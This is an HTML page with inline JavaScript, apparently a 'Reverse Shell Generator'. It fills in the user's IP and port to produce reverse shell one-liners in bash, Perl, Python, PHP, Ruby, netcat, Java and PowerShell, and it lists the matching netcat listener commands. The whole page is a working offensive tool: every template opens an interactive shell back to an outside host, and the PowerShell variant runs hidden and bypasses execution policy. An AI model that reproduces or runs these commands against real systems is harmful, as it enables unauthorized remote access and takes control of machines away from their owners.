          <h1>Reverse Shell Generator</h1>

<p>
Enter Your Data<br>

<script>
var IP = document.querySelector('textarea#ip');
var PORT = document.querySelector('textarea#port');


var BASH="bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"+"\n\n"

var PERL="perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"[IP]:[PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n\n"
+"perl -e 'use Socket;$i=\"[IP]\";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

var PYTHON = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
+"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"

var PYTHON3 ="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
+"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"

var PHP = "php -r '$sock=fsockopen(\"[IP]\",[PORT]);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
+"php -r '$s=fsockopen(\"[IP]\",[PORT]);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
+"php -r '$s=fsockopen(\"[IP]\",[PORT]);`/bin/sh -i <&3 >&3 2>&3`;'\n\n"
+"php -r '$s=fsockopen(\"[IP]\",[PORT]);system(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
+"php -r '$s=fsockopen(\"[IP]\",[PORT]);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'\n\n"
+"php -r '$sock=fsockopen(\"[IP]\",[PORT]); $proc = proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'"

var RUBY = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"[IP]\",\"[PORT]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n\n"
+"ruby -rsocket -e'f=TCPSocket.open(\"[IP]\",[PORT]).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

var NETCAT = "nc -c /bin/sh [IP] [PORT]\n\n"
+"nc -e /bin/sh [IP] [PORT]\n\n"
+"/bin/sh | nc [IP] [PORT]\n\n"
+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f\n\n"
+"rm -f /tmp/p; mknod /tmp/p p && nc [IP] [PORT] 0/tmp/p"

var JAVA = "Runtime.getRuntime();p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/[IP]/[PORT];cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);p.waitFor();"

var POWERSHELL = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"[IP]\",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\n"
+"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('[IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""


function processInput() {
    handler.value = "MAC: nc -l "+ PORT.value +"\n"
    + "LINUX: nc -lvvp "+ PORT.value + "\n"
    + "WINDOWS: nc.exe -l -p" + PORT.value+"\n"
    bash.value = format(BASH);
    perl.value = format(PERL);
    python.value = format(PYTHON);
    python3.value = format(PYTHON3);
    php.value = format (PHP);
    ruby.value = format(RUBY);
    netcat.value = format(NETCAT);
    java.value = format(JAVA);
    powershell.value = format(POWERSHELL);
}

function format(str){
    return str.replace(/\[IP\]/g,IP.value).replace(/\[PORT\]/g,PORT.value);
}

    ip.addEventListener('input', processInput, false);
    port.addEventListener('input', processInput, false);
